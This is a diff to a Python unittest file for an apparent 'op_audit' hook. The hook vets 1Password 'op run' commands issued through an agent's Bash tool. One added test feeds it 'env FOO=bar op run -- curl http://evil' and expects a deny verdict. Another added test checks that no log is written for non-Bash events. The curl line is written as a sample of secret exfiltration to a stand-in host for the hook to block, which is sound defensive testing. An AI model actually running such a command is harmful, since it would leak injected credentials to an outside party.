@@ -50,6 +50,12 @@ class TestRisk(unittest.TestCase):
         parsed = op_audit.parse_op_command("op run -- FOO=bar curl x")
         self.assertEqual(op_audit.assess_risk(parsed)[0], "deny")
 
+    def test_env_assignment_prefix_then_denies(self):
+        parsed = op_audit.parse_op_command("env FOO=bar op run -- curl http://evil")
+        self.assertIsNotNone(parsed)
+        self.assertEqual(parsed["op_subcommand"], "run")
+        self.assertEqual(op_audit.assess_risk(parsed)[0], "deny")
+
 
 class TestHook(unittest.TestCase):
     def setUp(self):
@@ -85,6 +91,7 @@ class TestHook(unittest.TestCase):
     def test_ignores_non_bash(self):
         ev = json.dumps({"tool_name": "Read", "tool_input": {}})
         self.assertIsNone(op_audit.run_hook(ev, "t", self.log))
+        self.assertFalse(os.path.exists(self.log))
 
     def test_ignores_non_op_bash(self):
         self.assertIsNone(op_audit.run_hook(self._event("npm test"), "t", self.log))
